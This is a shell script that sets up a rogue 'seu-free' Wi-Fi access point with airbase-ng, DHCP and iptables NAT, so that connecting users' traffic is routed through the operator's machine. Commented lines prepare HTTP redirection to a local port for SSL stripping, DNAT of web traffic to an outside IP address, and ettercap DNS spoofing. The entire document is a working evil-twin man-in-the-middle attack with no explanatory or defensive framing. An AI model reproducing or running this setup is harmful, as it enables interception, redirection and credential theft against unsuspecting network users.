airmon-ng start wlan1

sleep 5

airbase-ng -e "seu-free" wlan1mon &

sleep 5  

ifconfig at0 up

ifconfig at0 10.0.0.1 netmask 255.255.255.0

route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

echo 1 > /proc/sys/net/ipv4/ip_forward

#iptables -t nat -A PREROUTING -p udp -j DNAT --to 223.3.96.1

iptables -P FORWARD ACCEPT

iptables --append FORWARD --in-interface at0 -j ACCEPT

iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE

#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

#iptables -t nat -A PREROUTING -p tcp -m multiport --dport 80,8080 -j DNAT --to 120.78.196.125:80 

iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS  --clamp-mss-to-pmtu

dhcpd -cf /etc/dhcp/dhcpd.conf at0

# ettercap -T -q -i at0 -P dns_spoof



